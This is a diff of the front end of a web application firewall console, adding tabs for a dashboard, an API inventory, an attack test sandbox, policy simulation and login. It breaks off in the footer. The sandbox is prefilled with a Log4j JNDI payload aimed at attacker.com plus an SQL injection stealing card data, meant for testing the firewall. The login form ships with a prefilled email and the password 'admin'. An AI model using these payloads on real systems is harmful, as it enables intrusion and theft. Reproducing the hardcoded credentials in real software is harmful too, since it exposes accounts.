@@ -3,32 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SENTINELGRID // ARCHITECTURAL DEFENSE CONSOLE</title>
-  <!-- Google Fonts: Plus Jakarta Sans (Clean, modern Swiss sans) + Space Mono -->
+  <title>SentinelGrid // Modular Security Console</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
   
   <style>
     :root {
-      /* Warm Organic Natural Palette (Zero metallics, zero cyber-neon) */
-      --cream-bg: #F9F8F5;          /* Warm soft linen cream canvas */
-      --card-white: #FFFFFF;        /* Pure milk white surfaces */
-      --sand-warm: #EFECE6;         /* Earthy light sand for table heads & dividers */
-      --stone-border: #E0DDD5;      /* Subtle organic clay border */
-      
-      --terracotta: #D3543A;        /* Warm natural terracotta for blocks & critical alerts */
-      --terracotta-soft: #FBF0ED;   /* Pastel terracotta wash for alert badges */
-      
-      --sage-green: #3F7A60;        /* Earthy forest sage for safe passes & active nodes */
-      --sage-soft: #EEF5F1;         /* Gentle sage wash for allow badges */
-      
-      --deep-indigo: #2D4059;       /* Deep mineral indigo for primary actions */
-      --warm-ochre: #C68B59;        /* Warm artisan ochre for warnings & challenges */
-      --ochre-soft: #FAF3EC;        /* Soft ochre badge background */
-      
-      --text-charcoal: #1C1E21;     /* Deep soft charcoal for sharp readable typography */
-      --text-muted: #6B7280;        /* Muted organic grey for secondary labels */
+      --cream-bg: #F9F8F5;
+      --card-white: #FFFFFF;
+      --sand-warm: #EFECE6;
+      --stone-border: #E0DDD5;
+      --terracotta: #D3543A;
+      --terracotta-soft: #FBF0ED;
+      --sage-green: #3F7A60;
+      --sage-soft: #EEF5F1;
+      --deep-indigo: #2D4059;
+      --warm-ochre: #C68B59;
+      --ochre-soft: #FAF3EC;
+      --text-charcoal: #1C1E21;
+      --text-muted: #6B7280;
       
       --font-ui: 'Plus Jakarta Sans', -apple-system, sans-serif;
       --font-mono: 'Space Mono', monospace;
@@ -36,116 +30,144 @@
       --radius-sm: 8px;
       --radius-md: 14px;
       --radius-lg: 20px;
-      
-      /* Subtle soft shadows, organic elevation */
       --shadow-sm: 0 2px 6px rgba(28, 30, 33, 0.04);
       --shadow-md: 0 8px 24px rgba(28, 30, 33, 0.06);
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       background-color: var(--cream-bg);
       color: var(--text-charcoal);
       font-family: var(--font-ui);
-      line-height: 1.5;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      padding: 28px 36px;
     }
 
-    .container {
-      max-width: 1600px;
-      margin: 0 auto;
-      width: 100%;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
-
-    /* Top Clean Navigation Header */
-    .top-nav {
+    /* Top Horizontal Navigation Bar */
+    .app-header {
       background: var(--card-white);
-      border: 1px solid var(--stone-border);
-      border-radius: var(--radius-lg);
-      padding: 18px 28px;
+      border-bottom: 1px solid var(--stone-border);
+      padding: 0 32px;
+      height: 72px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 28px;
-      box-shadow: var(--shadow-sm);
+      position: sticky;
+      top: 0;
+      z-index: 100;
     }
 
-    .brand-group {
+    .brand-area {
       display: flex;
       align-items: center;
-      gap: 16px;
+      gap: 12px;
     }
 
-    .brand-mark {
-      width: 44px;
-      height: 44px;
-      border-radius: 12px;
+    .brand-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
       background: var(--sand-warm);
       color: var(--terracotta);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 22px;
+      font-size: 20px;
       font-weight: 800;
     }
 
-    .brand-text h1 {
-      font-size: 20px;
+    .brand-title {
+      font-size: 18px;
       font-weight: 800;
-      letter-spacing: -0.5px;
       color: var(--text-charcoal);
     }
 
-    .brand-text p {
-      font-size: 12px;
-      color: var(--text-muted);
-      font-weight: 500;
+    /* Modular Navigation Menu Tabs */
+    .nav-menu {
+      display: flex;
+      gap: 6px;
+      background: var(--cream-bg);
+      padding: 5px;
+      border-radius: 12px;
+      border: 1px solid var(--stone-border);
     }
 
-    .nav-actions {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-
-    .status-pill {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      background: var(--sage-soft);
-      color: var(--sage-green);
-      padding: 7px 16px;
-      border-radius: 30px;
-      font-size: 12px;
+    .nav-item {
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 13px;
       font-weight: 600;
-      font-family: var(--font-mono);
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
 
-    .status-dot {
-      width: 8px;
-      height: 8px;
+    .nav-item:hover {
+      color: var(--text-charcoal);
+    }
+
+    .nav-item.active {
+      background: var(--card-white);
+      color: var(--deep-indigo);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      font-weight: 700;
+    }
+
+    .user-profile-badge {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .avatar-circle {
+      width: 36px;
+      height: 36px;
       border-radius: 50%;
-      background: var(--sage-green);
+      background: var(--sand-warm);
+      color: var(--deep-indigo);
+      font-weight: 700;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid var(--stone-border);
     }
 
-    /* Natural Button Styles */
+    /* App Container & Views */
+    .app-main {
+      padding: 32px;
+      max-width: 1540px;
+      margin: 0 auto;
+      width: 100%;
+      flex: 1;
+    }
+
+    .view-section {
+      display: none;
+    }
+
+    .view-section.active {
+      display: block;
+      animation: fadeIn 0.2s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Buttons */
     .btn {
       font-family: var(--font-ui);
       font-size: 13px;
       font-weight: 700;
       padding: 10px 18px;
-      border-radius: 10px;
+      border-radius: 8px;
       border: 1px solid transparent;
       cursor: pointer;
       display: inline-flex;
@@ -154,124 +176,19 @@
       transition: all 0.2s ease;
     }
 
-    .btn-primary {
-      background: var(--deep-indigo);
-      color: #FFFFFF;
-    }
+    .btn-primary { background: var(--deep-indigo); color: #fff; }
+    .btn-primary:hover { background: #1D2B3C; }
+    .btn-warm { background: var(--terracotta); color: #fff; }
+    .btn-subtle { background: var(--sand-warm); color: var(--text-charcoal); border-color: var(--stone-border); }
 
-    .btn-primary:hover {
-      background: #1E2B3C;
-      transform: translateY(-1px);
-      box-shadow: var(--shadow-sm);
-    }
-
-    .btn-warm {
-      background: var(--terracotta);
-      color: #FFFFFF;
-    }
-
-    .btn-warm:hover {
-      background: #B8432C;
-      transform: translateY(-1px);
-    }
-
-    .btn-subtle {
-      background: var(--sand-warm);
-      color: var(--text-charcoal);
-      border-color: var(--stone-border);
-    }
-
-    .btn-subtle:hover {
-      background: #E5E1D8;
-    }
-
-    /* Metric Cards Grid */
-    .metric-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 20px;
-      margin-bottom: 28px;
-    }
-
-    @media (max-width: 1200px) {
-      .metric-grid { grid-template-columns: repeat(2, 1fr); }
-    }
-    @media (max-width: 600px) {
-      .metric-grid { grid-template-columns: 1fr; }
-    }
-
-    .metric-card {
-      background: var(--card-white);
-      border: 1px solid var(--stone-border);
-      border-radius: var(--radius-md);
-      padding: 24px;
-      box-shadow: var(--shadow-sm);
-      transition: all 0.2s ease;
-    }
-
-    .metric-card:hover {
-      box-shadow: var(--shadow-md);
-      transform: translateY(-2px);
-    }
-
-    .metric-card.accent-terracotta {
-      border-top: 4px solid var(--terracotta);
-    }
-
-    .metric-card.accent-sage {
-      border-top: 4px solid var(--sage-green);
-    }
-
-    .metric-card.accent-indigo {
-      border-top: 4px solid var(--deep-indigo);
-    }
-
-    .metric-card.accent-ochre {
-      border-top: 4px solid var(--warm-ochre);
-    }
-
-    .metric-label {
-      font-size: 12px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: var(--text-muted);
-      margin-bottom: 10px;
-    }
-
-    .metric-value {
-      font-size: 36px;
-      font-weight: 800;
-      color: var(--text-charcoal);
-      font-family: var(--font-mono);
-      margin-bottom: 6px;
-    }
-
-    .metric-hint {
-      font-size: 13px;
-      color: var(--text-muted);
-      font-weight: 500;
-    }
-
-    /* Main Working Area: 2 Columns */
-    .main-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 28px;
-      margin-bottom: 28px;
-    }
-
-    @media (max-width: 1100px) {
-      .main-grid { grid-template-columns: 1fr; }
-    }
-
+    /* Panels & Cards */
     .panel {
       background: var(--card-white);
       border: 1px solid var(--stone-border);
       border-radius: var(--radius-md);
       box-shadow: var(--shadow-sm);
-      margin-bottom: 28px;
       overflow: hidden;
+      margin-bottom: 24px;
     }
 
     .panel-header {
@@ -281,377 +198,463 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-    }
-
-    .panel-header h2 {
-      font-size: 15px;
+      font-size: 14px;
       font-weight: 700;
-      color: var(--text-charcoal);
     }
 
-    .panel-body {
-      padding: 24px;
-    }
+    .panel-body { padding: 24px; }
 
-    /* Clean Organic Tables */
-    .table-clean {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 13px;
-    }
-
+    /* Clean Tables */
+    .table-clean { width: 100%; border-collapse: collapse; font-size: 13px; }
     .table-clean th {
       text-align: left;
       padding: 12px 20px;
       background: #F4F2EB;
       color: var(--text-muted);
-      font-weight: 700;
       font-size: 11px;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
+      font-weight: 700;
       border-bottom: 1px solid var(--stone-border);
     }
+    .table-clean td { padding: 14px 20px; border-bottom: 1px solid var(--stone-border); }
+    .table-clean tr:hover { background: #FAF9F6; }
 
-    .table-clean td {
-      padding: 15px 20px;
-      border-bottom: 1px solid var(--stone-border);
-      color: var(--text-charcoal);
+    /* Metric Cards */
+    .metric-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+      margin-bottom: 28px;
+    }
+    .metric-card {
+      background: var(--card-white);
+      border: 1px solid var(--stone-border);
+      border-radius: var(--radius-md);
+      padding: 24px;
+    }
+    .metric-card.terracotta { border-top: 4px solid var(--terracotta); }
+    .metric-card.sage { border-top: 4px solid var(--sage-green); }
+    .metric-card.indigo { border-top: 4px solid var(--deep-indigo); }
+    .metric-card.ochre { border-top: 4px solid var(--warm-ochre); }
+
+    .metric-val {
+      font-size: 36px;
+      font-weight: 800;
+      font-family: var(--font-mono);
+      margin: 8px 0;
     }
 
-    .table-clean tr:hover {
-      background: #FAF9F6;
-    }
-
-    .table-clean tr:last-child td {
-      border-bottom: none;
-    }
-
-    /* Soft Earthy Badges */
+    /* Badges */
     .badge {
-      display: inline-flex;
-      align-items: center;
+      display: inline-block;
       padding: 4px 10px;
       border-radius: 6px;
       font-size: 11px;
       font-weight: 700;
       font-family: var(--font-mono);
-      letter-spacing: 0.5px;
+    }
+    .badge-allow { background: var(--sage-soft); color: var(--sage-green); }
+    .badge-block { background: var(--terracotta-soft); color: var(--terracotta); }
+    .badge-challenge { background: var(--ochre-soft); color: var(--warm-ochre); }
+    .badge-shadow { background: #F4E8EE; color: #922B53; }
+
+    /* Auth Forms Modal / Full-Screen view */
+    .auth-card {
+      max-width: 440px;
+      margin: 40px auto;
+      background: var(--card-white);
+      border: 1px solid var(--stone-border);
+      border-radius: var(--radius-lg);
+      padding: 36px;
+      box-shadow: var(--shadow-md);
     }
 
-    .badge-allow {
-      background: var(--sage-soft);
-      color: var(--sage-green);
-    }
-
-    .badge-block {
-      background: var(--terracotta-soft);
-      color: var(--terracotta);
-    }
-
-    .badge-challenge {
-      background: var(--ochre-soft);
-      color: var(--warm-ochre);
-    }
-
-    .badge-shadow {
-      background: #F4E8EE;
-      color: #922B53;
-    }
-
-    /* Natural Form Inputs */
-    .form-group {
-      margin-bottom: 18px;
-    }
-
-    .form-group label {
-      display: block;
-      font-size: 12px;
-      font-weight: 700;
-      color: var(--text-charcoal);
-      margin-bottom: 6px;
-    }
-
-    .input-warm {
+    .form-input {
       width: 100%;
       background: var(--cream-bg);
       border: 1px solid var(--stone-border);
       border-radius: 8px;
-      padding: 10px 14px;
-      font-family: var(--font-mono);
-      font-size: 13px;
-      color: var(--text-charcoal);
+      padding: 12px 14px;
+      font-family: var(--font-ui);
+      font-size: 14px;
+      margin: 6px 0 16px;
       outline: none;
-      transition: all 0.2s ease;
     }
 
-    .input-warm:focus {
+    .form-input:focus {
       border-color: var(--deep-indigo);
       background: var(--card-white);
-      box-shadow: 0 0 0 3px rgba(45, 64, 89, 0.08);
-    }
-
-    /* Clean Card Output Container */
-    .result-container {
-      background: #F7F5F0;
-      border: 1px solid var(--stone-border);
-      border-radius: 10px;
-      padding: 16px;
-      margin-top: 16px;
-      font-family: var(--font-mono);
-      font-size: 12px;
-      color: var(--text-charcoal);
-      display: none;
-      line-height: 1.6;
-    }
-
-    .result-container.active {
-      display: block;
-    }
-
-    /* Modern Natural Footer */
-    .footer-bar {
-      margin-top: auto;
-      padding: 20px 24px;
-      border-top: 1px solid var(--stone-border);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      color: var(--text-muted);
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
+  <!-- Top Persistent App Header with Navigation Menu -->
+  <header class="app-header">
+    <div class="brand-area">
+      <div class="brand-icon">🛡️</div>
+      <div class="brand-title">SentinelGrid WAAP</div>
+    </div>
 
-    <!-- Top Navigation Header -->
-    <header class="top-nav">
-      <div class="brand-group">
-        <div class="brand-mark">🛡️</div>
-        <div class="brand-text">
-          <h1>SentinelGrid WAAP</h1>
-          <p>Application & API Threat Protection Platform</p>
+    <!-- Modular Menu Tabs -->
+    <nav class="nav-menu">
+      <div class="nav-item active" onclick="switchTab('dashboard')">📊 Live Dashboard</div>
+      <div class="nav-item" onclick="switchTab('inventory')">🔍 Discovered APIs</div>
+      <div class="nav-item" onclick="switchTab('sandbox')">🧪 In-Line WAF Lab</div>
+      <div class="nav-item" onclick="switchTab('simulation')">📈 Policy Simulation</div>
+      <div class="nav-item" onclick="switchTab('onboarding')">🔌 Site Setup Guide</div>
+    </nav>
+
+    <!-- User / Auth Corner -->
+    <div class="user-profile-badge">
+      <div id="auth-logged-in-box" style="display: flex; align-items: center; gap: 10px;">
+        <div class="avatar-circle" id="user-avatar">AD</div>
+        <div style="font-size: 12px;">
+          <div id="user-display-name" style="font-weight: 700;">Anup Dhokiya</div>
+          <div style="color: var(--text-muted);" id="user-display-role">Administrator</div>
+        </div>
+        <button class="btn btn-subtle" style="padding: 6px 10px; font-size: 11px;" onclick="switchTab('login')">Sign Out</button>
+      </div>
+      <button id="auth-login-btn" class="btn btn-primary" style="display: none;" onclick="switchTab('login')">Login / Signup</button>
+    </div>
+  </header>
+
+  <!-- Main View Router -->
+  <main class="app-main">
+
+    <!-- ===================================================================== -->
+    <!-- TAB 1: LIVE DASHBOARD -->
+    <!-- ===================================================================== -->
+    <section id="view-dashboard" class="view-section active">
+      <div class="metric-grid">
+        <div class="metric-card indigo">
+          <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">PROTECTED APIS</div>
+          <div class="metric-val" id="kpi-endpoints">--</div>
+          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-websites">Active Domains</div>
+        </div>
+        <div class="metric-card terracotta">
+          <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">SHADOW / ZOMBIE APIS</div>
+          <div class="metric-val" id="kpi-shadow" style="color: var(--terracotta);">--</div>
+          <div style="font-size: 12px; color: var(--text-muted);">Undocumented Endpoints Flagged</div>
+        </div>
+        <div class="metric-card sage">
+          <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">MITIGATED ATTACKS</div>
+          <div class="metric-val" id="kpi-blocked" style="color: var(--sage-green);">--</div>
+          <div style="font-size: 12px; color: var(--text-muted);" id="kpi-blockrate">--% Block Rate</div>
+        </div>
+        <div class="metric-card ochre">
+          <div style="font-size: 12px; font-weight: 700; color: var(--text-muted);">ED25519 CRYPTO INTEGRITY</div>
+          <div class="metric-val" style="font-size: 24px; padding-top: 10px;">RFC 8032</div>
+          <div style="font-size: 12px; color: var(--text-muted);">Zero-Trust Asymmetric Seal</div>
         </div>
       </div>
 
-      <div class="nav-actions">
-        <div class="status-pill">
-          <div class="status-dot"></div>
-          <span>In-Line Engine Active</span>
+      <div class="panel">
+        <div class="panel-header">
+          <span>Real-Time Security Events Stream</span>
+          <button class="btn btn-subtle" onclick="refreshDashboard()">⚡ Refresh Feed</button>
         </div>
-        <button class="btn btn-primary" onclick="refreshConsole()">
-          <span>⚡</span> Sync Telemetry
-        </button>
-        <button class="btn btn-warm" onclick="triggerRollback()">
-          <span>↺</span> 1-Click Rollback
-        </button>
-      </div>
-    </header>
-
-    <!-- Warm Organic Metric KPI Cards -->
-    <section class="metric-grid">
-      <div class="metric-card accent-indigo">
-        <div class="metric-label">Protected Endpoints</div>
-        <div class="metric-value" id="kpi-endpoints">--</div>
-        <div class="metric-hint" id="kpi-websites">Across -- Websites</div>
-      </div>
-
-      <div class="metric-card accent-terracotta">
-        <div class="metric-label">Shadow & Zombie APIs</div>
-        <div class="metric-value" id="kpi-shadow" style="color: var(--terracotta);">--</div>
-        <div class="metric-hint">Undocumented Endpoints Flagged</div>
-      </div>
-
-      <div class="metric-card accent-sage">
-        <div class="metric-label">Mitigated Threats</div>
-        <div class="metric-value" id="kpi-blocked" style="color: var(--sage-green);">--</div>
-        <div class="metric-hint" id="kpi-blockrate">--% Attack Mitigation Rate</div>
-      </div>
-
-      <div class="metric-card accent-ochre">
-        <div class="metric-label">Cryptographic Integrity</div>
-        <div class="metric-value" style="font-size: 24px; padding-top: 8px;">RFC 8032</div>
-        <div class="metric-hint">Ed25519 Asymmetric Verification</div>
+        <table class="table-clean">
+          <thead>
+            <tr>
+              <th>Timestamp</th>
+              <th>Client IP</th>
+              <th>Method & Target URI</th>
+              <th>Risk Score</th>
+              <th>Verdict</th>
+              <th>OWASP / CVE Signature</th>
+            </tr>
+          </thead>
+          <tbody id="telemetry-body">
+            <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">Loading live security events...</td></tr>
+          </tbody>
+        </table>
       </div>
     </section>
 
-    <!-- Main Two Column Grid -->
-    <main class="main-grid">
-
-      <!-- Left Column: Tables -->
-      <div>
-
-        <!-- Live Telemetry Stream -->
-        <div class="panel">
-          <div class="panel-header">
-            <h2>Real-Time Security Events Stream</h2>
-            <span style="font-size: 12px; font-family: var(--font-mono); color: var(--text-muted);">Latency: &lt; 2ms</span>
-          </div>
-          <table class="table-clean">
-            <thead>
-              <tr>
-                <th>Time (UTC)</th>
-                <th>Client IP</th>
-                <th>Method / Target</th>
-                <th>Risk Score</th>
-                <th>Action</th>
-                <th>Triggered Rule</th>
-              </tr>
-            </thead>
-            <tbody id="telemetry-body">
-              <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 28px;">Loading incoming security events...</td></tr>
-            </tbody>
-          </table>
+    <!-- ===================================================================== -->
+    <!-- TAB 2: DISCOVERED APIS (SHADOW / ZOMBIE CATALOG) -->
+    <!-- ===================================================================== -->
+    <section id="view-inventory" class="view-section">
+      <div class="panel">
+        <div class="panel-header">
+          <span>Automated API Attack Surface Inventory (Shadow & Zombie Catalog)</span>
+          <button class="btn btn-primary" onclick="loadEndpoints()">Resync Schema</button>
         </div>
-
-        <!-- Discovered API Catalog -->
-        <div class="panel">
-          <div class="panel-header">
-            <h2>Automated API Inventory & Shadow Discovery</h2>
-            <button class="btn btn-subtle" style="padding: 6px 12px; font-size: 11px;" onclick="loadEndpoints()">Resync Schema</button>
-          </div>
+        <div class="panel-body" style="padding: 0;">
           <table class="table-clean">
             <thead>
               <tr>
                 <th>Classification</th>
-                <th>Domain</th>
-                <th>Method</th>
-                <th>Path</th>
-                <th>Risk Level</th>
+                <th>Target Domain</th>
+                <th>HTTP Method</th>
+                <th>Route Path</th>
+                <th>Risk Severity</th>
                 <th>Last Observed</th>
               </tr>
             </thead>
             <tbody id="endpoints-body">
-              <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 28px;">Mapping route catalog...</td></tr>
+              <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">Loading API route inventory...</td></tr>
             </tbody>
           </table>
         </div>
-
       </div>
+    </section>
 
-      <!-- Right Column: Interactive Testing & Simulation -->
-      <div>
+    <!-- ===================================================================== -->
+    <!-- TAB 3: IN-LINE WAF INSPECTION SANDBOX -->
+    <!-- ===================================================================== -->
+    <section id="view-sandbox" class="view-section">
+      <div class="panel" style="max-width: 800px; margin: 0 auto;">
+        <div class="panel-header">
+          <span>In-Line Attack Injection Lab</span>
+          <span style="font-size: 12px; font-family: var(--font-mono); color: var(--text-muted);">Sub-1.5ms Inspection Budget</span>
+        </div>
+        <div class="panel-body">
+          <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">
+            Transmit adversarial payloads (SQLi, XSS, Path Traversal, Log4j CVE-2021-44228, Cloud SSRF) to test real-time interception.
+          </p>
 
-        <!-- Live Attack Injection Lab -->
-        <div class="panel">
-          <div class="panel-header">
-            <h2>In-Line Request Inspection Sandbox</h2>
+          <label style="font-size: 12px; font-weight: 700;">Target Route & Method</label>
+          <div style="display: flex; gap: 10px;">
+            <select id="attack-method" class="form-input" style="width: 120px;">
+              <option value="POST">POST</option>
+              <option value="GET">GET</option>
+            </select>
+            <input type="text" id="attack-path" class="form-input" value="/api/v1/checkout/stripe">
           </div>
-          <div class="panel-body">
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 16px;">
-              Inject attack vectors (SQLi, XSS, Path Traversal) to verify local sub-5ms policy enforcement.
-            </p>
 
-            <div class="form-group">
-              <label>Target Route & HTTP Method</label>
-              <div style="display: flex; gap: 8px;">
-                <select id="attack-method" class="input-warm" style="width: 100px;">
-                  <option value="POST">POST</option>
-                  <option value="GET">GET</option>
-                </select>
-                <input type="text" id="attack-path" class="input-warm" value="/api/v1/checkout/stripe">
-              </div>
-            </div>
+          <label style="font-size: 12px; font-weight: 700;">Adversarial Payload (Injection String)</label>
+          <textarea id="attack-body" class="form-input" rows="3">${jndi:ldap://attacker.com/exploit} OR '1'='1' UNION SELECT credit_card FROM vault--</textarea>
 
-            <div class="form-group">
-              <label>Payload (Injection String)</label>
-              <textarea id="attack-body" class="input-warm" rows="3">id=102' UNION SELECT card_number, cvv, exp FROM accounts--</textarea>
-            </div>
+          <label style="font-size: 12px; font-weight: 700;">Client User-Agent / Headers</label>
+          <input type="text" id="attack-ua" class="form-input" value="SqlMap/1.8 (Automated Auditor)">
 
-            <div class="form-group">
-              <label>Client User-Agent</label>
-              <input type="text" id="attack-ua" class="input-warm" value="SqlMap/1.8 (Automated Auditor)">
-            </div>
+          <button class="btn btn-warm" style="width: 100%; justify-content: center; padding: 14px;" onclick="fireLiveAttack()">
+            ⚡ Transmit & Evaluate Through Security Brain
+          </button>
 
-            <button class="btn btn-warm" style="width: 100%; justify-content: center; padding: 12px;" onclick="fireLiveAttack()">
-              Transmit & Inspect Request
-            </button>
+          <div id="attack-output" style="display: none; margin-top: 20px; padding: 18px; border-radius: 8px; font-family: var(--font-mono); font-size: 13px; background: #F4F2EB; border: 1px solid var(--stone-border);"></div>
+        </div>
+      </div>
+    </section>
 
-            <div id="attack-output" class="result-container"></div>
+    <!-- ===================================================================== -->
+    <!-- TAB 4: POLICY SIMULATION (DRY-RUN) -->
+    <!-- ===================================================================== -->
+    <section id="view-simulation" class="view-section">
+      <div class="panel" style="max-width: 800px; margin: 0 auto;">
+        <div class="panel-header">
+          <span>Policy Simulation (False-Positive Predictor)</span>
+          <button class="btn btn-warm" style="padding: 6px 12px; font-size: 11px;" onclick="triggerRollback()">↺ 1-Click Rollback</button>
+        </div>
+        <div class="panel-body">
+          <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">
+            Replays candidate security rule modifications against historical traffic to predict block deltas and protect search engine bots before deployment.
+          </p>
+
+          <label style="font-size: 12px; font-weight: 700;">Candidate Rule Name</label>
+          <input type="text" id="sim-rule-id" class="form-input" value="block-unverified-bots">
+
+          <label style="font-size: 12px; font-weight: 700;">Match User-Agent Substring</label>
+          <input type="text" id="sim-rule-ua" class="form-input" value="bot">
+
+          <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 14px;" onclick="runSimulation()">
+            📈 Replay Historical Traffic Samples
+          </button>
+
+          <div id="sim-output" style="display: none; margin-top: 20px; padding: 18px; border-radius: 8px; font-family: var(--font-mono); font-size: 13px; background: #F4F2EB; border: 1px solid var(--stone-border);"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- TAB 5: ONBOARDING / SETUP ON OTHER SITES -->
+    <!-- ===================================================================== -->
+    <section id="view-onboarding" class="view-section">
+      <div class="panel">
+        <div class="panel-header">
+          <span>How to Integrate SentinelGrid on External Sites & Applications</span>
+          <a href="/docs/HOW_TO_SETUP_ON_OTHER_SITES.txt" target="_blank" class="btn btn-primary" style="font-size: 11px; padding: 6px 12px; text-decoration: none;">Download TXT Guide</a>
+        </div>
+        <div class="panel-body">
+          <h3 style="font-size: 16px; margin-bottom: 12px;">3-Step Integration Workflow</h3>
+          <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+            SentinelGrid operates seamlessly via <strong>Nginx Reverse Proxy</strong>, <strong>Python ASGI Middleware</strong>, or <strong>Node.js Express Middleware</strong> without changing your database or application architecture.
+          </p>
+
+          <div style="background: var(--sand-warm); padding: 18px; border-radius: 10px; font-family: var(--font-mono); font-size: 13px; line-height: 1.6;">
+            <strong>Step 1: Point your site's proxy/middleware to SentinelGrid:</strong><br>
+            <code>Endpoint: http://localhost:8000/v1/inspect</code><br><br>
+            <strong>Step 2: Inspect requests in-line (< 1.5ms budget):</strong><br>
+            If SentinelGrid returns <code>action: "BLOCK"</code>, return <code>HTTP 403 Forbidden</code>.<br>
+            If SentinelGrid returns <code>action: "ALLOW"</code>, pass the request to your backend.<br><br>
+            <strong>Step 3: Access Full Detailed Instructions:</strong><br>
+            Read the dedicated documentation file located at: <code>/run/media/anup/D/sentinelgrid/docs/HOW_TO_SETUP_ON_OTHER_SITES.txt</code>
           </div>
         </div>
+      </div>
+    </section>
 
-        <!-- Policy Simulation & False Positive Predictor -->
-        <div class="panel">
-          <div class="panel-header">
-            <h2>Policy Simulation (False-Positive Predictor)</h2>
-          </div>
-          <div class="panel-body">
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 16px;">
-              Replay proposed rules against historical traffic before rollout to prevent breaking legitimate crawlers.
-            </p>
-
-            <div class="form-group">
-              <label>Rule Identifier</label>
-              <input type="text" id="rule-id" class="input-warm" value="block-generic-bots">
-            </div>
-
-            <div class="form-group">
-              <label>Match User-Agent Substring</label>
-              <input type="text" id="rule-ua" class="input-warm" value="bot">
-            </div>
-
-            <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 12px;" onclick="runSimulation()">
-              Run Dry-Run Replay
-            </button>
-
-            <div id="sim-output" class="result-container"></div>
-          </div>
+    <!-- ===================================================================== -->
+    <!-- TAB 6: LOGIN & SIGNUP PORTAL -->
+    <!-- ===================================================================== -->
+    <section id="view-login" class="view-section">
+      <div class="auth-card">
+        <div style="text-align: center; margin-bottom: 24px;">
+          <div class="brand-icon" style="margin: 0 auto 12px;">🛡️</div>
+          <h2 style="font-size: 22px; font-weight: 800;">SentinelGrid Authentication</h2>
+          <p style="color: var(--text-muted); font-size: 13px;">Sign in to access your tenant WAAP console</p>
         </div>
 
+        <div id="login-form-box">
+          <label style="font-size: 12px; font-weight: 700;">Email Address</label>
+          <input type="email" id="auth-email" class="form-input" value="anupdhokiya0@gmail.com">
+
+          <label style="font-size: 12px; font-weight: 700;">Password</label>
+          <input type="password" id="auth-password" class="form-input" value="admin">
+
+          <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 12px;" onclick="handleLogin()">
+            Sign In to Console
+          </button>
+
+          <p style="text-align: center; font-size: 13px; margin-top: 18px; color: var(--text-muted);">
+            Don't have an account? <a href="javascript:void(0)" onclick="toggleAuthMode('signup')" style="color: var(--terracotta); font-weight: 700; text-decoration: none;">Create an account</a>
+          </p>
+        </div>
+
+        <div id="signup-form-box" style="display: none;">
+          <label style="font-size: 12px; font-weight: 700;">Full Name</label>
+          <input type="text" id="signup-name" class="form-input" placeholder="e.g. Anup Dhokiya">
+
+          <label style="font-size: 12px; font-weight: 700;">Email Address</label>
+          <input type="email" id="signup-email" class="form-input" placeholder="analyst@domain.com">
+
+          <label style="font-size: 12px; font-weight: 700;">Password</label>
+          <input type="password" id="signup-password" class="form-input" placeholder="••••••••">
+
+          <button class="btn btn-warm" style="width: 100%; justify-content: center; padding: 12px;" onclick="handleSignup()">
+            Create Organization Account
+          </button>
+
+          <p style="text-align: center; font-size: 13px; margin-top: 18px; color: var(--text-muted);">
+            Already have an account? <a href="javascript:void(0)" onclick="toggleAuthMode('login')" style="color: var(--deep-indigo); font-weight: 700; text-decoration: none;">Sign in here</a>
+          </p>
+        </div>
       </div>
+    </section>
 
-    </main>
+  </main>
 
-    <!-- Natural Footer -->
-    <footer class="footer-bar">
-      <div>SentinelGrid WAAP // Application Security & Governance</div>
